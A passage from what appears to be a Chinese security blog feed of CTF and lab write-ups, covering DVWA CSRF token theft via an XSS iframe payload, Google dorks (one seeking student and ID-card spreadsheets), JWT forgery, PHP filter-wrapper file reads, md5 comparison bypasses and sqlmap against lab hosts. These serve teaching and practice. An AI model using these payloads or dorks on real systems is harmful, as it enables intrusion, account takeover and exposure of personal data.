class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现多了这个<code>generateSessionToken()</code>​函数，这个是用来生成token的，具体介绍如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Anti-CSRF token机制，用户每次访问该页面时，服务器都会返回一个随机的token（generateSessionToken();），向服务器发起请求时，</span><br><span class="line">需要提交token参数，而服务器在收到请求时，会优先检查token,只有token正确，才会处理客户端的请求。</span><br></pre></td></tr></table></figure>

<p>这里的话我们有两种方式</p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>借助XSS来获取token，这个网页中有一个high的xss漏洞，如果我们通过xss得到token，此时就可以按照之前的方法来进行CSRF了，打开存储型XSS，发现这里限制了输入长度，F12修改一下即可<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149268_62f3de1432566e69049f9.jpeg" class="" title="在这里插入图片描述"><br>测试后发现过滤了script，这里的话我们可用其他标签获取token</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;../csrf/&quot;</span> onload=<span class="title function_ invoke__">alert</span>(frames[<span class="number">0</span>].document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].value)&gt;</span><br></pre></td></tr></table></figure>

<p>输入后提交，刷新界面就会出现此时的token<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149269_62f3de155115b5699559f.jpeg" class="" title="在这里插入图片描述"><br>这时候按照之前的方法进行CSRF即可，在提交的时候额外带上一个CSRF就可以了</p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>正常情况下抓包后发包，由于token更新，这个已经失效，访问会变成302<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149270_62f3de169329f0790bfa1.jpeg" class="" title="在这里插入图片描述"><br>这时候利用burpsuite中的CSRF插件来进行攻击(这个插件可以自动更新token)。在拓展中找到<code>CSRF Token Tracker</code>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149271_62f3de178e8b11a00ed94.jpeg" class="" title="在这里插入图片描述"><br>安装一下，打开它添加Host和对应的token名<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149272_62f3de189287ea0c4361f.jpeg" class="" title="在这里插入图片描述"><br>此时再重放<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149273_62f3de1968658d01e445e.jpeg" class="" title="在这里插入图片描述"><br>成功修改密码，实现CSRF</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2023/10/23/Google%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h1><p>学号 身份证 site:edu.cn filetype:xls</p>
<p>‍</p>
<h1 id="intext-在​-正文​中搜索指定的关键字"><a href="#intext-在​-正文​中搜索指定的关键字" class="headerlink" title="intext 在​***正文​中搜索指定的关键字*"></a><strong>intext 在</strong>​***<u>正文</u><em><strong>​</strong>中搜索指定的关键字</em>*</h1><img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718130903-ih477cq.png" class="" title="image">

<img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718131642-q44rwk1.png" class="" title="image">​​

<h1 id="inurl在URL中搜索指定的关键字"><a href="#inurl在URL中搜索指定的关键字" class="headerlink" title="inurl在URL中搜索指定的关键字"></a><strong>inurl在URL中搜索指定的关键字</strong></h1><img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718132146-fuxl4cm.png" class="" title="image">​

<img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718132158-bla4oxt.png" class="" title="image">​

<img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718132351-y4snjgg.png" class="" title="image">​

<h1 id="intitle在标题中搜索指定的关键字"><a href="#intitle在标题中搜索指定的关键字" class="headerlink" title="intitle在标题中搜索指定的关键字"></a><strong>intitle在标题中搜索指定的关键字</strong></h1><img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718133155-rnicdl2.png" class="" title="image">​

<h1 id="site搜索包含关键词的站点"><a href="#site搜索包含关键词的站点" class="headerlink" title="site搜索包含关键词的站点"></a><strong>site搜索包含关键词的站点</strong></h1><img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718131543-857exrk.png" class="" title="image">

<img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718132533-yqyinr4.png" class="" title="image">​

<img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718132639-kf0kme8.png" class="" title="image">​​

<h1 id="filetype搜索指定文件类型"><a href="#filetype搜索指定文件类型" class="headerlink" title="filetype搜索指定文件类型"></a><strong>filetype搜索指定文件类型</strong></h1><img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718131724-klaqtdl.png" class="" title="image">​

<p>‍</p>
<h1 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h1><img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718133028-o1e6mqm.png" class="" title="image">​

<h1 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h1><p>摄像头</p>
<img src="/2023/10/23/Google%E8%AF%AD%E6%B3%95/image-20230718133613-jwdxh5b.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>Curl基本使用</title>
    <url>/2023/10/23/Curl/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h1><p>1.查询公网IP</p>
<p>curl ifconfig.co</p>
<p>curl -v ifconfig.co (显示过程)</p>
<p>‍</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>HTML5新标签及相应的安全分析</title>
    <url>/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="HTML5新标签及相应的安全分析"><a href="#HTML5新标签及相应的安全分析" class="headerlink" title="HTML5新标签及相应的安全分析"></a>HTML5新标签及相应的安全分析</h1><img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020204804-y9y4zt2.png" class="" title="image">​

<p>‍</p>
<img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020204824-mk2kl8d.png" class="" title="image">​

<img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020204856-nbkyhbx.png" class="" title="image">​

<img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020204912-5atyfqx.png" class="" title="image">​

<img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020205016-eh9i4v5.png" class="" title="image">​

<img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020205155-83ukxw3.png" class="" title="image">​

<img src="/2023/10/23/HTML5%E6%96%B0%E6%A0%87%E7%AD%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/image-20231020211412-e4kkz2j.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>Nosql注入</title>
    <url>/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006230917-uesad3a.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006231002-uhonoi9.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006231027-a7pxno6.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006231124-7fnr5it.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006231224-x0duuy5.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006231542-rv4f3j9.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231007084556-ki3ibwo.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231007084707-4m0fd2f.png" class="" title="image">​

<img src="/2023/10/23/Nosql%E6%B3%A8%E5%85%A5/image-20231006233317-au4tcvg.png" class="" title="image">​

<p>‍</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>JWT</title>
    <url>/2023/10/23/JWT/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="1-注册普通用户，登陆成功后抓包获取jwt的值"><a href="#1-注册普通用户，登陆成功后抓包获取jwt的值" class="headerlink" title="1.注册普通用户，登陆成功后抓包获取jwt的值"></a>1.注册普通用户，登陆成功后抓包获取jwt的值</h2><img src="/2023/10/23/JWT/image-20231008172314-21v9sgn.png" class="" title="image">​

<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluMSJ9.Os9bQfexyM1GxoY3Q-JlvRLUx0bA-y6FR4Mv6zV_Cuk</p>
<p>利用工具求出key</p>
<img src="/2023/10/23/JWT/image-20231008202112-9ld5ct2.png" class="" title="image">​

<p>然后利用网站<a href="https://jwt.io/%E6%9E%84%E9%80%A0%E5%87%BA%E6%96%B0%E7%9A%84jwt">https://jwt.io/构造出新的jwt</a></p>
<img src="/2023/10/23/JWT/image-20231008202151-b5jb57g.png" class="" title="image">​

<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.9avq5ApZ-XZul2kbon8z2cB6Y4bNru_0nnIZfJ1mO50</p>
<p>思路一：利用Editthiscookie插件修改jwt的值，刷新即可得到flag</p>
<p>思路二：也可以利用bp自带的浏览器，每次都需要修改jwt的值</p>
<img src="/2023/10/23/JWT/image-20231008202435-c50llij.png" class="" title="image">​

<img src="/2023/10/23/JWT/image-20231008202552-7qqjuf3.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>PHP伪协议</title>
    <url>/2023/10/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>PHP伪协议是一种用于在PHP中访问不同资源和执行不同操作的特殊URL方案。这些伪协议以 <code>php://</code>​ 开头，后跟不同的标识符，用于指示要执行的操作。以下是一些常见的PHP伪协议及其用途：</p>
<ol>
<li><strong>php:&#x2F;&#x2F;input：</strong> 这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。</li>
<li><strong>php:&#x2F;&#x2F;output：</strong> 这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。</li>
<li><strong>php:&#x2F;&#x2F;stdin：</strong> 用于访问标准输入流。</li>
<li><strong>php:&#x2F;&#x2F;stdout：</strong> 用于访问标准输出流。</li>
<li><strong>php:&#x2F;&#x2F;stderr：</strong> 用于访问标准错误输出流。</li>
<li><strong>php:&#x2F;&#x2F;temp：</strong> 用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。</li>
<li><strong>php:&#x2F;&#x2F;memory：</strong> 用于在内存中创建可读写的数据流。</li>
<li><strong>php:&#x2F;&#x2F;filter：</strong> 这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。</li>
<li><strong>php:&#x2F;&#x2F;globals：</strong> 用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。</li>
<li><strong>php:&#x2F;&#x2F;fd：</strong> 用于访问文件描述符。它允许您在PHP中访问底层文件系统。</li>
</ol>
<p>这些伪协议可以用于访问不同类型的资源，例如文件、输入&#x2F;输出流、内存数据等。它们在PHP中提供了更灵活的数据处理和资源访问的方式。但要小心使用，确保不滥用它们，因为错误的使用可能导致安全漏洞。</p>
<h1 id="1-例一"><a href="#1-例一" class="headerlink" title="1.例一"></a>1.例一</h1><p>使用 php:&#x2F;&#x2F;filter&#x2F;read 从一个URL中读取数据，并对其进行Base64解码。</p>
<p>如果base被过滤，可以考虑utf编码绕过。</p>
<p>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;imposible.php</p>
<p>php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;imposible.php</p>
<p>‍</p>
<p>在 <code>php://filter/read=convert.base64-encode/resource=</code>​ 中，<code>resource</code>​ 后面应该跟着要编码的资源的标识符，这个标识符通常是文件路径或数据流的名称。具体来说，您需要提供要进行Base64编码的资源的标识符。</p>
<ul>
<li>如果您要对文件进行编码，那么 <code>resource</code>​ 应该是文件的路径，例如 <code>/path/to/your/file.txt</code>​。</li>
<li>如果您要对数据流进行编码，那么 <code>resource</code>​ 应该是数据流的名称或标识符。</li>
</ul>
<p>换句话说，<code>resource</code>​ 应该是指向您要处理的具体资源的标识符。编码过程将基于此资源执行，并且结果将被返回以供读取或处理。</p>
<img src="/2023/10/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20231009184211-bcv23gz.png" class="" title="image">​

<h1 id="2-例二"><a href="#2-例二" class="headerlink" title="2.例二"></a>2.例二</h1><p><strong>php:&#x2F;&#x2F;input：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the 504sys&quot;</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|data|base|write|input/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;I am sorry but no way!&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  //imposible.php</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20231016093606-can3fpc.png" class="" title="image">​

<img src="/2023/10/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20231016093704-4t6l324.png" class="" title="image">​

<p><strong>单看文字，没看懂是什么意思。在上面的例子可以看到 当user&#x3D;“the user is a admin”的时候，才会输出hello world 。然后上面hackbar中，没有将user变量直接复制为”the user is a admin”，而是，先等于php:&#x2F;&#x2F;input，然后用post请求提交一个值是“the user is admin”。可以看到网页输出了hello admin！依旧可以达到user&#x3D;“the user is a admin”的效果。这样我就理解了刚才的那句话 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分 。</strong><br>​<img src="/2023/10/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20231016093824-44dmz43.png" class="" title="image">​</p>
<img src="/2023/10/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20231016094332-jmly9oo.png" class="" title="image">​
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>PHP原生类利用</title>
    <url>/2023/10/23/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="PHP原生类利用"><a href="#PHP原生类利用" class="headerlink" title="PHP原生类利用"></a>PHP原生类利用</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$sys</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;|flag|&quot;</span>, <span class="variable">$xsx</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;flag is no here!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$xsx</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xsx&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$sys</span>(<span class="variable">$xsx</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2><p>发现echo new $sys($$xsx)。说明这是一道原生类利用的题。</p>
<p><strong>php中内置很多原生的类，在CTF中常以</strong>​<code>echo new $a($b);</code>​这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。</p>
<h2 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h2><p><strong>这道题是文件读取类：SplFileObject。</strong></p>
<p><strong>当用文件目录遍历到了敏感文件时，可以用</strong>​<code>SplFileObject</code>​类，同样通过echo触发<code>SplFileObject</code>​中的<code>__toString()</code>​方法。(该类不支持通配符，所以必须先获取到完整文件名称才行)</p>
<p><strong>除此之外其实</strong>​<code>SplFileObject</code>​类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若题目中没有给出foreach函数的话，就要用伪协议读取文件的内容。</p>
<p><strong>例如：SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read</strong>&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</p>
<h2 id="3-构造payload"><a href="#3-构造payload" class="headerlink" title="3.构造payload"></a>3.构造payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?sys=<span class="built_in">SplFileObject</span>&amp;xsx=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20231013093808-8c61kzb.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>PHP等号绕过</title>
    <url>/2023/10/23/PHP%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="PHP等号绕过"><a href="#PHP等号绕过" class="headerlink" title="PHP等号绕过"></a>PHP等号绕过</h1><h2 id="1、a-b-md5-a-md5-b"><a href="#1、a-b-md5-a-md5-b" class="headerlink" title="1、a != b &amp;&amp; md5(a) == md5(b)"></a>1、a != b &amp;&amp; md5(a) == md5(b)</h2><p><strong>思路一：</strong>找出md5值都是两个0e开头的开头的。原理是php里面在做 &#x3D;&#x3D; 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。<br>举例：<br>QNKCDZO<br>s155964671a<br>s1091221200a<br>等等…<br>示例：</p>
<img src="/2023/10/23/PHP%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87/image-20231023171919-gyuzlbg.png" class="" title="image">​

<p><strong>思路二</strong>：数组绕过。原理是md5等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。看下面的示例，是返回了yes的。（题目中就传入    ?a[]&#x3D;1&amp;b[]&#x3D;2    ）</p>
<img src="/2023/10/23/PHP%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87/image-20231023172016-6hmlp76.png" class="" title="image">​

<h2 id="2-a-b-md5-a-md5-b"><a href="#2-a-b-md5-a-md5-b" class="headerlink" title="2.a != b &amp;&amp; md5(a) ==&#x3D; md5(b)"></a>2.a != b &amp;&amp; md5(a) ==&#x3D; md5(b)</h2><p>这里就不存在上面的第一种绕过了，但是依然可以用第二种方法绕过。</p>
<p>?a[]&#x3D;123&amp;b[]&#x3D;456</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>SQLmap基本使用</title>
    <url>/2023/10/23/SQLmap/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h1><h2 id="一：特性"><a href="#一：特性" class="headerlink" title="一：特性"></a>一：特性</h2><img src="/2023/10/23/SQLmap/image-20231004232053-y02ubxs.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231004232114-nv5418q.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231004232144-2k8wiuh.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005172339-5ezbdow.png" class="" title="image">​

<h2 id="二：直连数据库"><a href="#二：直连数据库" class="headerlink" title="二：直连数据库"></a>二：直连数据库</h2><img src="/2023/10/23/SQLmap/image-20231005172425-nr1deii.png" class="" title="image">​

<h2 id="三：设定目标"><a href="#三：设定目标" class="headerlink" title="三：设定目标"></a>三：设定目标</h2><img src="/2023/10/23/SQLmap/image-20231005172527-uglvhum.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005172608-is4ksvd.png" class="" title="image">​

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;csrftoken=8eOKzCbgRE84TPxlPGaQhKZVdcNGFPXTsvB1OGgyyHzuAM1cLAku0dAw5SG1ogH2; security_level=0; PHPSESSID=ehhboecc5qdr1e77lp2ipjsv40&quot;</span> </span><br><span class="line">-u <span class="string">&quot;http://192.168.149.136:88/sqli_2.php?movie=1&amp;action=go&quot;</span> -f --banner --dbs --users</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231005174237-s2339qw.png" class="" title="image">​

<h2 id="四：通过level设定检测深度"><a href="#四：通过level设定检测深度" class="headerlink" title="四：通过level设定检测深度"></a>四：通过level设定检测深度</h2><img src="/2023/10/23/SQLmap/image-20231005174447-j8zm75n.png" class="" title="image">

<img src="/2023/10/23/SQLmap/image-20231005181803-iiiamtl.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005181740-6965gso.png" class="" title="image">

<h2 id="通过–level参数，加大探测深度。（例如：User-Agent注入）"><a href="#通过–level参数，加大探测深度。（例如：User-Agent注入）" class="headerlink" title="通过–level参数，加大探测深度。（例如：User-Agent注入）"></a>通过–level参数，加大探测深度。（例如：User-Agent注入）</h2><img src="/2023/10/23/SQLmap/image-20231005181610-lqu7gfw.png" class="" title="image">​

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap --cookie <span class="string">&quot;security_level=0; PHPSESSID=7q9ch1dgdqu6ttvuf22bahqeo4&quot;</span> </span><br><span class="line"> -u  <span class="string">&quot;http://192.168.149.136:88/sqli_17.php&quot;</span> -f --banner --dbs --users </span><br><span class="line">--level <span class="number">3</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231005184234-is9eay9.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005184525-joxd35r.png" class="" title="image">​

<h2 id="五：-g选项"><a href="#五：-g选项" class="headerlink" title="五：-g选项"></a>五：-g选项</h2><img src="/2023/10/23/SQLmap/image-20231005184659-4ayj9ir.png" class="" title="image">​

<h2 id="六：risk和level选项"><a href="#六：risk和level选项" class="headerlink" title="六：risk和level选项"></a>六：risk和level选项</h2><img src="/2023/10/23/SQLmap/image-20231005185823-czlfcg3.png" class="" title="image">​

<img src="/2023/10/23/SQLmap/image-20231005185951-hzxn8cj.png" class="" title="image">​

<p>‍</p>
<p>不加参数，直接退出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.149.136:86/Less-31/&quot;</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SQLmap/image-20231005191029-rlsb2e4.png" class="" title="image">​

<p>加入参数</p>
